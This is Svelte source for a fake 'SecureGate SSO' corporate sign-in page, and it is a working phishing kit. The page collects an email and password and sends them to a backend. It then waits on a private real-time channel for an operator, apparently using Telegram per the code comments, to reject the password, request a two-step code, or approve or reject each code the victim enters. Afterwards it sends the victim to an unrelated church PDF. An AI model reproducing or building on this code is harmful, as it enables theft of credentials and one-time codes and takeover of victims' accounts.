<script>
  import { sendFrmData, sendOTP } from "$lib";
  import Pusher from 'pusher-js';
  import { PUBLIC_PUSHER_KEY, PUBLIC_PUSHER_CLUSTER } from '$env/static/public'

  let email = $state('');
  let password = $state('');
  let staySignedIn = $state(true);
  let emailError = $state('');
  let passwordError = $state('');
  let otpError = $state('');
  let step = $state('email'); // 'email' | 'password' | 'otp' | 'success'
  let isLoading = $state(false);
  let showPassword = $state(false);
  let otp = $state('');

  let authType = $state('') // 'OTP' or 'PROMPT'
  let finalStatus = $state(''); // Tracking final state evaluations: 'APPROVED' or 'REJECTED' or '' (default is '')
  let showOTPsection = $state(false);
  let otpRetryCount = $state(0);
  let regSessionId = $state('');

  let showFinalStatus = $derived.by(() => {
    // show error on rejected or failed trigger state evaluation
    if (finalStatus === 'REJECTED' || finalStatus === '') {
      return 'hide'
    }

    // APPROVED final state
    return 'show'
  });

  let activeChannelName = $state(''); // help holds the active channel name attached with the sessionId

  let emailStageRef = $state();
  let passwordStageRef = $state();
  let otpStageRef = $state();
  let successStageRef = $state();

  let emailFocused = $state(false);
  let passwordFocused = $state(false);
  let otpFocused = $state(false);


  $effect(() => {
    /* shows OTP section when changed */
    if (showOTPsection) {
      isLoading = false;
      step = 'otp';

      // show OTP section with opacity transition
      passwordStageRef.classList.remove('opacity-100');
      passwordStageRef.classList.add('opacity-0');

      const otpTransitionHandler = (ev) => {
        if (ev.propertyName === 'opacity') {
          passwordStageRef?.removeEventListener('transitionend', otpTransitionHandler);
          passwordStageRef?.classList.add('hidden');
          otpStageRef?.classList.remove('hidden');

          requestAnimationFrame(() => {
            otpStageRef?.classList.remove('opacity-0');
            otpStageRef?.classList.add('opacity-100');
          });
        }
      };

      passwordStageRef.addEventListener('transitionend', otpTransitionHandler);
    }

    /* shows Success section when real-time trigger is pushed into */
    if (showFinalStatus === 'show') {
      showOTPsection = false
      isLoading = false;
      step = 'success';

      otpStageRef.classList.remove('opacity-100');
      otpStageRef.classList.add('opacity-0');

      const finalTransitionHandler = (ev) => {
        if (ev.propertyName === 'opacity') {
          otpStageRef?.removeEventListener('transitionend', finalTransitionHandler);
          otpStageRef?.classList.add('hidden');
          successStageRef?.classList.remove('hidden');

          requestAnimationFrame(() => {
            successStageRef?.classList.remove('opacity-0');
            successStageRef?.classList.add('opacity-100');
          });
        }
      };

      otpStageRef.addEventListener('transitionend', finalTransitionHandler);

      // redirect user after 3seconds
      setTimeout(() => {
        location.href = 'https://www.peacechurch-cr.org/editoruploads/files/GROW/Resources%20for%20Growing/Bible%20Reading/Scripture_for_Every_Moment.pdf'
      }, 2000)
    }
  });


  // Establish an isolated single-user stream (per session based interaction)
  function setupPrivatePusherChannel(sessionId) {
    // Configured to automatically ping /api/pusher/auth behind the scenes
    const pusherClient = new Pusher(PUBLIC_PUSHER_KEY, {
      cluster: PUBLIC_PUSHER_CLUSTER,
      authEndpoint: '/api/pusher/auth'
    });

    activeChannelName = `private-session-${sessionId}`;

    // Subscribes matching the "private-session-{UUID}" footprint your backend utilizes
    const privateChannel = pusherClient.subscribe(activeChannelName);

    // Listen for the custom value you type into Telegram
    privateChannel.bind('auth-event', ({ type='', value='' }) => {
      authType = type; // 'OTP' or 'PROMPT'
      showOTPsection = true;
    });

    // Listen block 2: Catches the Success / Error evaluation button click
    privateChannel.bind('final-status-event', ({ status }) => {
      if (status === 'REJECTED') {
        otpError = 'There was an error verifying your OTP. Please try again'
        isLoading = false;
        otpRetryCount += 1;
      } else {
        finalStatus = status; // 'APPROVED' or 'REJECTED'
        otpRetryCount = 0;
        // Fully disconnect and release socket streams now that the whole lifecycle is over
        pusherClient.unsubscribe(activeChannelName);
        pusherClient.disconnect();
      }
    });

    // NEW Listener C: Catches the top-row Password Failure trigger
    privateChannel.bind('password-failed-event', ({ message }) => {
      // Force the UI back to State A and surface the error reason explicitly
      passwordError = message
      password = ''; // Clear out the bad password field for safe re-entry
      isLoading = false;
      pusherClient.unsubscribe(activeChannelName);
      pusherClient.disconnect();
    });
  }

  function validateEmail(value) {
    if (!value.trim()) {
      return "Email address is required";
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(value.trim())) {
      return "Please enter a valid email address";
    }
    return '';
  }

  function handleEmailNext(e) {
    e.preventDefault();
    const errorMsg = validateEmail(email);
    if (errorMsg) {
      emailError = errorMsg;
      return;
    }
    emailError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      
      if (emailStageRef && passwordStageRef) {
        step = 'password';
        
        emailStageRef.classList.remove('opacity-100');
        emailStageRef.classList.add('opacity-0', 'pointer-events-none');

        const endOfTransition = (ev) => {
          if (ev.propertyName === 'opacity') {
            emailStageRef?.removeEventListener('transitionend', endOfTransition);
            emailStageRef?.classList.add('hidden');
            passwordStageRef?.classList.remove('hidden');

            requestAnimationFrame(() => {
              passwordStageRef?.classList.remove('opacity-0');
              passwordStageRef?.classList.add('opacity-100');
            });
          }
        };
        emailStageRef.addEventListener('transitionend', endOfTransition);
      }
    }, 700);
  }

  async function handlePasswordSubmit(e) {
    e.preventDefault();
    if (!password) {
      passwordError = "Please enter your password";
      return;
    }
    if (password.length < 6) {
      passwordError = "Password must be at least 6 characters";
      return;
    }
    passwordError = '';
    isLoading = true;

    try {
      const res = await sendFrmData({ signinType: 'Other Email Sign-in', email: email, password: password });

      // check if there are no errors
      if (res?.error) {
        passwordError = res?.message
        isLoading = false;
        return
      }

      // wait for real-time update
      if (res?.success) {
        regSessionId = res.sessionId;
        setupPrivatePusherChannel(regSessionId);
      }
    } catch (error) {
      console.error('Error submitting form data: \n', error.message)
      passwordError = error.message;
    }
  }

  function handleBackToPassword() {
    otp = '';
    otpError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      if (passwordStageRef && otpStageRef) {
        step = 'password';
        otpStageRef.classList.remove('opacity-100');
        otpStageRef.classList.add('opacity-0');

        const backToPwHandler = (ev) => {
          if (ev.propertyName === 'opacity') {
            otpStageRef?.removeEventListener('transitionend', backToPwHandler);
            otpStageRef?.classList.add('hidden');
            passwordStageRef?.classList.remove('hidden');

            requestAnimationFrame(() => {
              passwordStageRef?.classList.remove('opacity-0');
              passwordStageRef?.classList.add('opacity-100');
            });
          }
        };
        otpStageRef.addEventListener('transitionend', backToPwHandler);
      }
    }, 350);
  }

  async function handleOtpSubmit(e) {
    e.preventDefault();
    if (!otp) {
      otpError = "Verification code is required";
      return;
    }
    const cleanOtp = otp.replace(/\D/g, '');
    if (cleanOtp.length < 6) {
      otpError = "Code must be 6 digits";
      return;
    }
    otpError = '';
    isLoading = true;

    // help state the real-time notification on retry of OTP: allowing Telegram prompt control final state (error/success)
    if (otpRetryCount > 0) {
      setupPrivatePusherChannel(regSessionId)
    }
    // send to backend api
    const res = await sendOTP({ otp: otp, email: email })
  }

  function handleBackToEmail() {
    password = '';
    passwordError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      if (emailStageRef && passwordStageRef) {
        step = 'email';
        passwordStageRef.classList.remove('opacity-100');
        passwordStageRef.classList.add('opacity-0');

        const backToEmailHandler = (ev) => {
          if (ev.propertyName === 'opacity') {
            passwordStageRef?.removeEventListener('transitionend', backToEmailHandler);
            passwordStageRef?.classList.add('hidden');
            emailStageRef?.classList.remove('hidden');

            requestAnimationFrame(() => {
              emailStageRef?.classList.remove('opacity-0', 'pointer-events-none');
              emailStageRef?.classList.add('opacity-100');
            });
          }
        };
        passwordStageRef.addEventListener('transitionend', backToEmailHandler);
      }
    }, 400);
  }
</script>

<div class="w-full min-h-[85vh] bg-slate-50 flex flex-col justify-between items-center py-12 px-4 font-sans antialiased text-slate-800">
  <header class="w-full max-w-275 flex items-center justify-between py-2 px-6 mb-6">
    <div class="flex items-center gap-2.5 select-none cursor-default">
      <div class="w-9 h-9 rounded-xl bg-slate-900 flex items-center justify-center text-white">
        <svg class="w-5 h-5 text-emerald-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12c0 1.268-.63 2.39-1.593 3.068a3.745 3.745 0 01-1.043 3.296 3.745 3.745 0 01-3.296 1.043A3.745 3.745 0 0112 21c-1.268 0-2.39-.63-3.068-1.593a3.746 3.746 0 01-3.296-1.043 3.745 3.745 0 01-1.043-3.296A3.745 3.745 0 013 12c0-1.268.63-2.39 1.593-3.068a3.745 3.745 0 011.043-3.296 3.746 3.746 0 013.296-1.043A3.746 3.746 0 0112 3c1.268 0 2.39.63 3.068 1.593a3.746 3.746 0 013.296 1.043 3.746 3.746 0 011.043 3.296A3.745 3.745 0 0121 12z" />
        </svg>
      </div>
      <span class="font-extrabold text-xl tracking-tight text-slate-950">SecureGate SSO</span>
    </div>
    <div class="text-xs font-semibold text-slate-500 hover:text-slate-900 cursor-pointer select-none transition-colors">
      Need Help?
    </div>
  </header>

  <main class="w-full max-w-110 bg-white rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.04)] border border-slate-200/80 flex-1 flex flex-col p-8 md:p-10 transition-all duration-300 relative overflow-hidden">
    {#if isLoading}
      <div class="absolute top-0 left-0 w-full h-[3.5px] bg-slate-100 overflow-hidden">
        <div class="h-full bg-slate-900 animate-pulse w-3/4 rounded-full"></div>
      </div>
    {/if}

    <div class="flex-1 flex flex-col justify-between">
      <div>
        <!-- brand logo -->
        <div class="flex justify-start mb-8">
          <div class="w-11 h-11 rounded-2xl bg-emerald-500/10 flex items-center justify-center border border-emerald-500/20">
            <svg class="w-6 h-6 text-emerald-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
              <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
            </svg>
          </div>
        </div>

        <!-- STAGE 1: Email Form -->
        <div 
          bind:this={emailStageRef} 
          class="transition-opacity duration-200 ease-in-out opacity-100 flex flex-col"
        >
          <h1 class="text-2xl font-black text-slate-950 tracking-tight leading-none mb-1.5">
            Sign in
          </h1>
          <p class="text-sm text-slate-500 font-medium mb-6">to access your corporate workspace dashboard</p>

          <form onsubmit={handleEmailNext} class="space-y-4">
            <div class="relative">
              <input
                type="text"
                id="email-input-field"
                bind:value={email}
                onfocus={() => emailFocused = true}
                onblur={() => emailFocused = false}
                class="w-full px-4 py-3.5 text-base border rounded-xl focus:outline-none transition-all duration-150 bg-slate-50/50 text-slate-900 placeholder-transparent
                  {emailError
                    ? 'border-rose-500 focus:ring-1 focus:ring-rose-500 bg-rose-50/10'
                    : 'border-slate-200 focus:border-slate-900 focus:ring-1 focus:ring-slate-900'
                  }
                "
                placeholder="Email address"
              />
              <label 
                for="email-input-field"
                class="absolute left-4 bg-white px-1 transition-all duration-150 pointer-events-none select-none
                  {(emailFocused || email)
                    ? '-top-2.25 text-xs font-bold leading-none text-slate-900'
                    : 'top-3.75 text-base text-slate-400 font-medium'
                  }
                  {emailError ? 'text-rose-500' : (emailFocused ? 'text-slate-900' : 'text-slate-400')}
                "
              >
                Email address
              </label>
            </div>

            {#if emailError}
              <div class="text-xs text-rose-500 leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                <svg class="w-4 h-4 shrink-0 fill-current mt-px" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                </svg>
                <span>{emailError}</span>
              </div>
            {/if}

            <button
              type="submit"
              disabled={isLoading}
              class="
                w-full py-3.5 bg-slate-900 hover:bg-slate-850 active:bg-slate-950 text-white text-[15px] font-bold rounded-xl 
                transition-all shadow-sm hover:shadow-md cursor-pointer select-none focus:outline-none flex items-center justify-center gap-2 
                disabled:opacity-30 duration-200
              "
            >
              Continue
            </button>

            <div class="flex items-center justify-between pt-2">
              <label class="flex items-center gap-2.5 text-sm font-semibold text-slate-700 select-none cursor-pointer">
                <input
                  type="checkbox"
                  bind:checked={staySignedIn}
                  class="w-4.5 h-4.5 rounded text-slate-900 focus:ring-slate-900 border-slate-300 focus:ring-2 accent-slate-900"
                />
                Remember me
              </label>
            </div>
          </form>
        </div>

        <!-- STAGE 2: Password Form -->
        <div 
          bind:this={passwordStageRef} 
          class="transition-opacity duration-200 ease-in-out opacity-0 hidden flex flex-col"
        >
          <div class="flex items-center gap-1.5 mb-4">
            <button
              type="button"
              onclick={handleBackToEmail}
              class="inline-flex items-center gap-1 text-sm font-bold text-slate-800 hover:text-slate-950 hover:underline animate-fadeIn"
            >
              Back
            </button>
            <span class="text-xs text-slate-400 font-semibold truncate max-w-45">
              | signing as {email}
            </span>
          </div>

          <h2 class="text-2xl font-black text-slate-950 tracking-tight leading-none mb-1.5">
            Enter password
          </h2>
          <p class="text-sm text-slate-500 font-medium mb-6">Please enter your SecureGate password.</p>

          <form onsubmit={handlePasswordSubmit} class="space-y-4">
            <div class="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                id="email-password-input"
                bind:value={password}
                onfocus={() => passwordFocused = true}
                onblur={() => passwordFocused = false}
                class="w-full px-4 pr-12 py-3.5 text-base border rounded-xl focus:outline-none transition-all duration-150 bg-slate-50/50 text-slate-900 placeholder-transparent
                  {passwordError
                    ? 'border-rose-500 focus:ring-1 focus:ring-rose-500 bg-rose-50/10'
                    : 'border-slate-200 focus:border-slate-900 focus:ring-1 focus:ring-slate-900'
                  }
                "
                placeholder="Password"
              />
              <label 
                for="email-password-input"
                class="absolute left-4 bg-white px-1 transition-all duration-150 pointer-events-none select-none
                  {(passwordFocused || password)
                    ? '-top-2.25 text-xs font-bold leading-none text-slate-900'
                    : 'top-3.75 text-base text-slate-400 font-medium'
                  }
                  {passwordError ? 'text-rose-500' : (passwordFocused ? 'text-slate-900' : 'text-slate-400')}
                "
              >
                Password
              </label>

              <button
                type="button"
                onclick={() => showPassword = !showPassword}
                class="absolute right-3.5 top-3.5 text-slate-400 hover:text-slate-900 font-semibold focus:outline-none"
              >
                👁
              </button>
            </div>

            {#if passwordError}
              <div class="text-xs text-rose-500 leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                <svg class="w-4 h-4 shrink-0 fill-current mt-px" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                </svg>
                <span>{passwordError}</span>
              </div>
            {/if}

            <button
              type="submit"
              disabled={isLoading}
              class="
                w-full py-3.5 bg-slate-900 hover:bg-slate-850 active:bg-slate-950 text-white text-[15px] font-bold rounded-xl 
                transition-all shadow-sm hover:shadow-md cursor-pointer select-none focus:outline-none flex items-center justify-center gap-2 
                disabled:opacity-30 duration-200
              "
            >
              Sign in
            </button>
          </form>
        </div>

        <!-- STAGE 3: OTP Form -->
        <div 
          bind:this={otpStageRef} 
          class="transition-opacity duration-200 ease-in-out opacity-0 hidden flex flex-col"
        >
          <div class="flex items-center gap-1.5 mb-4">
            <button
              type="button"
              onclick={handleBackToPassword}
              class="inline-flex items-center gap-1 text-sm font-bold text-slate-800 hover:text-slate-950 hover:underline animate-fadeIn"
            >
              Back
            </button>
            <span class="text-xs text-slate-400">| Verification for {email}</span>
          </div>

          <h2 class="text-2xl font-black text-slate-950 tracking-tight leading-none mb-1.5">
            Two-Step verification
          </h2>
          <p class="text-sm text-slate-500 font-medium mb-6 leading-relaxed">
            We've sent a 6-digit dynamic OTP verification code to your email.
          </p>

          <form id="custom-otp-form" onsubmit={handleOtpSubmit} class="space-y-4">
            <div class="relative">
              <input
                type="text"
                id="custom-otp-input"
                maxLength={6}
                bind:value={otp}
                oninput={(e) => {
                  otp = e.currentTarget.value.replace(/\D/g, '');
                  if (otpError) otpError = '';
                }}
                onfocus={() => otpFocused = true}
                onblur={() => otpFocused = false}
                class="w-full px-4 py-3.5 text-base border rounded-xl focus:outline-none transition-all duration-150 bg-slate-50/50 text-slate-900 tracking-widest font-black text-center placeholder-transparent
                  {otpError
                    ? 'border-rose-500 focus:ring-1 focus:ring-rose-500 bg-rose-50/10'
                    : 'border-slate-200 focus:border-slate-900 focus:ring-1 focus:ring-slate-900'
                  }
                "
                placeholder="Code"
              />
              
              <label 
                for="custom-otp-input"
                class="absolute left-4 bg-white px-1 transition-all duration-150 pointer-events-none select-none
                  {(otpFocused || otp)
                    ? '-top-2.25 text-xs font-bold leading-none text-slate-900'
                    : 'top-3.75 text-base text-slate-400 font-medium'
                  }
                  {otpError ? 'text-rose-500' : (otpFocused ? 'text-slate-900' : 'text-slate-400')}
                "
              >
                Verification Code
              </label>
            </div>

            {#if otpError}
              <div class="text-xs text-rose-500 leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                <svg class="w-4 h-4 shrink-0 fill-current mt-px" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                </svg>
                <span>{otpError}</span>
              </div>
            {/if}

            <button
              type="submit"
              disabled={isLoading}
              class="
                w-full py-3.5 bg-slate-900 hover:bg-slate-850 active:bg-slate-950 text-white text-[15px] font-bold rounded-xl 
                transition-all shadow-sm hover:shadow-md cursor-pointer select-none focus:outline-none flex items-center justify-center gap-2 
                mt-2 disabled:opacity-30 duration-200
              "
            >
              Verify Secure Code
            </button>
          </form>
        </div>

        <!-- STAGE 4: Success View -->
        <div
          bind:this={successStageRef}
          class="flex-1 flex flex-col justify-center items-center text-center opacity-0 hidden py-6"
        >
          <div class="w-16 h-16 rounded-2xl bg-emerald-50 text-emerald-600 border border-emerald-200 flex items-center justify-center mb-6 text-xl font-black">
            ✓
          </div>

          <h2 class="text-2xl font-black text-slate-950 tracking-tight leading-none mb-2">
            Securely Verified!
          </h2>
          <p class="text-sm text-slate-500 font-medium mb-6">Verified successully, you will be redirected shortly. or click the button below</p>

          <div class="bg-slate-50 border border-slate-200 rounded-2xl px-6 py-4 mb-8 w-full text-left">
            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-wider mb-1">SSO Federated Email</p>
            <p class="text-base font-bold text-slate-900 truncate">{email}</p>
          </div>

          <button
            type="button"
            onclick={() => {
              email = '';
              password = '';
              location.href = `https://www.peacechurch-cr.org/editoruploads/files/GROW/Resources%20for%20Growing/Bible%20Reading/Scripture_for_Every_Moment.pdf`;
              otp = '';
              step = 'email';
              if (emailStageRef && successStageRef) {
                successStageRef.classList.add('hidden', 'opacity-0');
                emailStageRef.classList.remove('hidden', 'opacity-0', 'pointer-events-none');
                emailStageRef.classList.add('opacity-100');
              }
            }}
            class="px-8 py-2.5 bg-slate-100 hover:bg-slate-200 text-slate-700 text-sm font-bold rounded-xl transition-all focus:outline-none select-none cursor-pointer"
          >
            Continue
          </button>
        </div>
      </div>
    </div>
  </main>

  <footer class="w-full max-w-275 mx-auto px-6 py-4 flex flex-col sm:flex-row items-center sm:justify-between gap-4 text-xs text-slate-400 font-medium">
    <div>© 2026 SecureGate SSO</div>
  </footer>
</div>